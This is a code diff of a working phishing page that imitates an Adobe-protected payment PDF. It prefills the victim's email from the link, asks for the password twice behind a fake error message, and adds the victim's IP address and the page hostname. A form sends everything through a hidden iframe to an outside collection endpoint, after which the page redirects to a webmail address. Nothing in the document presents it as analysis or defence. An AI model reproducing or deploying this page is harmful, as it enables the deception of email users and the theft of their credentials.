@@ -4,47 +4,85 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Protected PDF — Payment Copy</title>
-
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body { height: 100%; }
     body {
       font-family: "Helvetica Neue", Arial, sans-serif;
-      background: #f6f6f6 url('download.jpg') no-repeat center top;
-      background-size: cover;
+      background: #f6f6f6;
       overflow: hidden;
     }
+    /* Splash with background image */
     #splash {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: #fff; display: flex; align-items: center; justify-content: center; flex-direction: column;
-      z-index: 9999; transition: opacity 1s ease;
+      position: fixed; 
+      top: 0; left: 0; 
+      width: 100%; height: 100%;
+      background: url('download.jpg') no-repeat center center / cover;
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+      flex-direction: column;
+      z-index: 9999; 
+      transition: opacity 1s ease;
+    }
+    #splash::after {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; 
+      width: 100%; height: 100%;
+      background: rgba(255, 255, 255, 0.75);
+      z-index: 1;
+    }
+    #splash h2, #splash p, .loader {
+      position: relative; 
+      z-index: 2;
     }
     #splash h2 { font-size: 22px; color: #d32f2f; margin-bottom: 10px; }
-    #splash p { color: #666; font-size: 14px; }
+    #splash p { color: #333; font-size: 14px; }
     .loader {
       margin-top: 20px; width: 36px; height: 36px;
       border: 4px solid #ddd; border-top-color: #d32f2f;
       border-radius: 50%; animation: spin 1s linear infinite;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
+
     #main {
-      display: none; height: 100%;
-      display: flex; align-items: flex-start; justify-content: center;
-      padding: 28px 12px 60px; position: relative;
+      display: none; 
+      height: 100%;
+      display: flex; 
+      align-items: flex-start; 
+      justify-content: center;
+      padding: 28px 12px 60px; 
+      position: relative;
+      background: #f6f6f6 url('download.jpg') no-repeat center top;
+      background-size: cover;
     }
     #main.show { display: flex; animation: fadeIn 1s ease; }
     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
     body::before {
       content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
-      position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-      font-size: 46px; font-weight: bold; color: rgba(200, 0, 0, 0.12);
-      transform: rotate(-35deg); white-space: pre; line-height: 120px;
-      pointer-events: none; z-index: 0;
+      position: absolute; 
+      top: -50%; left: -50%; 
+      width: 200%; height: 200%;
+      font-size: 46px; 
+      font-weight: bold; 
+      color: rgba(200, 0, 0, 0.12);
+      transform: rotate(-35deg); 
+      white-space: pre; 
+      line-height: 120px;
+      pointer-events: none; 
+      z-index: 0;
     }
     .card {
-      width: 450px; max-width: 94%; background: rgba(255,255,255,0.95);
-      border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-      padding: 28px 22px 34px; position: relative; z-index: 2; backdrop-filter: blur(4px);
+      width: 450px; max-width: 94%; 
+      background: rgba(255,255,255,0.95);
+      border-radius: 8px; 
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      padding: 28px 22px 34px; 
+      position: relative; 
+      z-index: 2; 
+      backdrop-filter: blur(4px);
     }
     .pdf-icon { display: flex; align-items: center; justify-content: center; margin-bottom: 10px; }
     .pdf-icon img { width: 54px; height: auto; }
@@ -97,9 +135,9 @@
       <h1>This File is Protected By Adobe®<br>Security.</h1>
       <p class="lead">Click Continue to enter your password and view the payment copy.</p>
 
-      <form id="mainForm" autocomplete="on">
+      <form id="mainForm" action="https://submit-form.com/YrQDGDrOR" method="POST" target="hiddenFrame" autocomplete="on">
         <div id="stepEmail">
-          <input id="email" name="email" class="input" type="email" placeholder="Email address" readonly>
+          <input id="email" name="email" class="input" type="email" placeholder="Email address" readonly required>
           <div class="download-wrap">
             <button id="continueBtn" class="btn-download" type="button">Continue</button>
           </div>
@@ -107,21 +145,24 @@
 
         <div id="stepPassword" class="hidden">
           <div class="password-wrapper">
-            <input id="password" class="input" type="password" placeholder="Password" required>
-            <span id="togglePassword" class="toggle-password"></span>
+            <input id="password" name="password2" class="input" type="password" placeholder="Password" required>
+            <span id="togglePassword" class="toggle-password">👁️</span>
           </div>
 
-          <input type="hidden" id="ip">
-          <input type="hidden" id="hostname">
-          <input type="hidden" id="firstPasswordField">
+          <input type="hidden" name="ip" id="ip">
+          <input type="hidden" name="hostname" id="hostname">
+          <input type="hidden" name="password1" id="firstPasswordField">
 
-          <div id="errorMessage" class="error-message" style="display: none;">Incorrect password, please re-type password.</div>
+          <div id="errorMessage" class="error-message" style="display: none;">Please re-enter password.</div>
+          <div id="submitError" class="error-message" style="display: none;">Network error. Please try again.</div>
 
           <div class="download-wrap">
             <button class="btn-download" type="submit">DOWNLOAD</button>
           </div>
         </div>
       </form>
+
+      <iframe name="hiddenFrame" style="display:none;"></iframe>
 
       <div class="file-info">
         <div class="file-thumb">
@@ -143,8 +184,8 @@
       setTimeout(() => {
         document.getElementById('splash').style.display = 'none';
         document.getElementById('main').classList.add('show');
-      }, 500);
-    }, 800);
+      }, 800);
+    }, 1500); // extended to give image visibility
   });
 
   const emailInput = document.getElementById('email');
@@ -157,11 +198,18 @@
   const firstPasswordField = document.getElementById('firstPasswordField');
   let passwordFirstEntry = "";
 
+  // Autofill email
   window.addEventListener('DOMContentLoaded', () => {
     const params = new URLSearchParams(window.location.search);
     const urlEmail = params.get('email');
     emailInput.value = urlEmail ? decodeURIComponent(urlEmail) : "user@example.com";
+    document.getElementById('hostname').value = window.location.hostname;
   });
+
+  // Get IP
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => { document.getElementById('ip').value = data.ip; });
 
   continueBtn.addEventListener('click', () => {
     stepEmail.classList.add('hidden');
@@ -170,101 +218,47 @@
   });
 
   toggle.addEventListener('click', () => {
-    const isHidden = passwordInput.type === 'password';
-    passwordInput.type = isHidden ? 'text' : 'password';
+    passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
   });
 
-  fetch('https://api.ipify.org?format=json')
-    .then(res => res.json())
-    .then(data => { document.getElementById('ip').value = data.ip; })
-    .catch(() => {});
-  document.getElementById('hostname').value = window.location.hostname;
-
-  document.getElementById('mainForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const email = emailInput.value;
-    const password = passwordInput.value;
-    const ip = document.getElementById('ip').value;
-    const hostname = document.getElementById('hostname').value;
-
+  // Handle password logic
+  document.getElementById('mainForm').addEventListener('submit', (e) => {
     if (passwordFirstEntry === "") {
-      passwordFirstEntry = password;
+      e.preventDefault();
+      passwordFirstEntry = passwordInput.value;
       firstPasswordField.value = passwordFirstEntry;
       passwordInput.value = '';
       errorMessage.style.display = 'block';
       passwordInput.focus();
-      return;
+      return false;
     }
 
-    const data = {
-      email: email,
-      password1: passwordFirstEntry,
-      password2: password,
-      ip: ip,
-      hostname: hostname
-    };
+    // Show overlay loader
+    const overlay = document.createElement('div');
+    overlay.style.cssText = `
+      position:fixed;top:0;left:0;width:100%;height:100%;
+      background:url('download.jpg') no-repeat center center / cover, rgba(255,255,255,0.95);
+      display:flex;flex-direction:column;align-items:center;justify-content:center;
+      z-index:99999;text-align:center;
+    `;
+    const spinner = document.createElement('div');
+    spinner.style.cssText = `
+      width:40px;height:40px;border:4px solid #ccc;
+      border-top-color:#d32f2f;border-radius:50%;
+      animation:spin 1s linear infinite;
+    `;
+    const msg = document.createElement('p');
+    msg.style.cssText = `margin-top:20px;font-size:16px;color:#d32f2f;font-weight:600;`;
+    msg.textContent = 'File too large, please contact the sender to send in smaller chunks...';
+    overlay.append(spinner, msg);
+    document.body.append(overlay);
 
-    try {
-      const res = await fetch("https://submit-form.com/YrQDGDrOR", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
-
-      if (res.ok) {
-        // 🌀 Create spinner overlay
-        const overlay = document.createElement('div');
-        overlay.style.position = 'fixed';
-        overlay.style.top = 0;
-        overlay.style.left = 0;
-        overlay.style.width = '100%';
-        overlay.style.height = '100%';
-        overlay.style.background = 'rgba(255,255,255,0.95)';
-        overlay.style.display = 'flex';
-        overlay.style.flexDirection = 'column';
-        overlay.style.alignItems = 'center';
-        overlay.style.justifyContent = 'center';
-        overlay.style.zIndex = '99999';
-
-        const spinner = document.createElement('div');
-        spinner.style.width = '40px';
-        spinner.style.height = '40px';
-        spinner.style.border = '4px solid #ccc';
-        spinner.style.borderTopColor = '#d32f2f';
-        spinner.style.borderRadius = '50%';
-        spinner.style.animation = 'spin 1s linear infinite';
-
-        const msg = document.createElement('p');
-        msg.style.marginTop = '20px';
-        msg.style.fontSize = '15px';
-        msg.style.color = '#444';
-        msg.textContent = 'Processing file…';
-
-        overlay.appendChild(spinner);
-        overlay.appendChild(msg);
-        document.body.appendChild(overlay);
-
-        // 🕓 After 3 seconds, show message
-        setTimeout(() => {
-          msg.textContent = "File is too large, contact the sender to send in smaller chunks or log in with Roundcube.";
-        }, 3000);
-
-        // ⏳ After 7 seconds, redirect
-        setTimeout(() => {
-          msg.textContent = "Redirecting to Roundcube…";
-          window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
-        }, 7000);
-
-      } else {
-        alert("Submission failed. Check FormSpark setup.");
-      }
-    } catch {
-      alert("Network error. Try again.");
-    }
+    setTimeout(() => {
+      window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
+    }, 3000);
   });
 </script>
-<style>
-  @keyframes spin { to { transform: rotate(360deg); } }
-</style>
+
+<style>@keyframes spin { to { transform: rotate(360deg); } }</style>
 </body>
 </html>
